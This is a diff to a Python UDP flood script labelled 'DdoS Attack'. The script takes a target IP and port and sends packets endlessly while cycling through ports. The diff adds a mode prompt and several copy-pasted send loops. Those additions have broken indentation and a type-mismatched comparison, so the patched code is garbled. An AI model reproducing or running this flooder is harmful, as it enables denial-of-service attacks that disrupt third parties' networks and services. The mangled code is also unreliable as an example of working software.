@@ -26,14 +26,14 @@ print "Note- This Tool An Illegal Tool & It's Only For Educational Purpose.. Use
 print
 ip = raw_input("IP Target : ")
 port = input("Port       : ")
+mode = input("mode 1 or 2")
 os.system("clear")
 print("\033[93m")
 os.system("figlet DdoS Attack")
 print("Team : nnoa")
 print ("\033[92m")
-
-
 sent = 0
+if mode == "1":
 while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
@@ -41,12 +41,38 @@ while True:
      print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
      if port == 65534:
        port = 1
-
-while True:
-     sock.sendto(bytes, (ip,port))
+  else:
+         sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
      print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
      if port == 65534:
        port = 1
 
+            sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     if port == 65534:
+       port = 1
+
+            sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     if port == 65534:
+       port = 1
+
+            sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     if port == 65534:
+       port = 1
+
+            sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     if port == 65534:
+       port = 1
